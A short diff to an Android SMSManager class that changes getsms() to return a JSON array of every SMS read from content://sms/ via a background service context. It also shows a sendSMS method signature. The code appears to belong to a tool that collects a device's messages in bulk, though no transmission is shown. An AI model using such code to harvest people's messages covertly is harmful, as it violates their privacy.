@@ -11,15 +11,14 @@ import org.json.JSONObject;
 
 public class SMSManager {
 
-    public static JSONObject getsms() {
-        JSONObject result = null;
+    public static JSONArray getsms() {
         JSONArray jarray = null;
 
         try {
 
             jarray = new JSONArray();
 
-            result = new JSONObject();
+            JSONObject result = new JSONObject();
             Uri uri = Uri.parse("content://sms/");
             Context act = MainService.getContextOfApplication();
             Cursor c = act.getContentResolver().query(uri, null, null, null, null);
@@ -58,7 +57,6 @@ public class SMSManager {
             }
             c.close();
 
-            result.put("smslist", jarray);
 
         } catch (IllegalArgumentException e) {
             // TODO Auto-generated catch block
@@ -67,7 +65,7 @@ public class SMSManager {
             // TODO Auto-generated catch block
             e.printStackTrace();
         }
-        return result;
+        return jarray;
     }
 
     public static boolean sendSMS(String phoneNo, String msg) {
